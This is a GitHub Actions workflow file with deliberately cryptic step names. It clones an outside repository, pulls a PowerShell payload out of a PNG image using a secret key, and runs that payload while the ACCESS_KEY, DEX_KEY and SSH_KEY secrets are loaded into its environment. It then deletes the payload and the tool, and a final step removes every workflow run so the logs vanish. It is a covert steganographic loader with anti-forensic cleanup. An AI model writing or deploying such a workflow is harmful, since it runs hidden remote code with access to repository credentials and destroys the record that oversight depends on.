name: weearefinallyfree

on:
  workflow_dispatch:

jobs:
  weearefinallyawake:
    runs-on: windows-latest
    permissions:
      actions: write
      contents: read

    steps:
      - name: r1dex
        uses: actions/checkout@v4
        
      - name: r2dex
        uses: actions/cache@v4
        with:
          path: |
            ~\AppData\Roaming\Code
            ~\.vscode\extensions
            C:\Windows\Temp\app_sessions
          key: ${{ runner.os }}-ghost-session
          restore-keys: |
            ${{ runner.os }}-ghost-session

      - name: r3dex
        shell: powershell
        env:
          A_KEY: ${{ secrets.ACCESS_KEY }}
          D_KEY: ${{ secrets.DEX_KEY }}
          SSH_KEY: ${{ secrets.SSH_KEY }}
        run: |
          git clone https://github.com/Sxeldest/dex-enc.git --quiet
          pip install -r dex-enc/requirements.txt --quiet
          $p = Join-Path $pwd "BondeXJS.png"
          if (Test-Path $p) {
              python dex-enc/dexenc.py extract -i $p -key "$env:D_KEY" --out-payload "$pwd\r4dx.ps1"
              if (Test-Path "$pwd\r4dx.ps1") {
                  Write-Host "[+] Executing extracted payload..." -ForegroundColor Green
                  . "$pwd\r4dx.ps1"
                  Remove-Item "$pwd\r4dx.ps1" -Force
                  Remove-Item -Recurse -Force dex-enc
              } else {
                  Write-Host "[-] Payload file not found in root!" -ForegroundColor Red
                  exit 1
              }
          }
          
      - name: r4dex
        uses: Mattraks/delete-workflow-runs@v2
        if: always()
        with:
          token: ${{ github.token }}
          repository: ${{ github.repository }}
          retain_days: 0
          keep_minimum_runs: 0
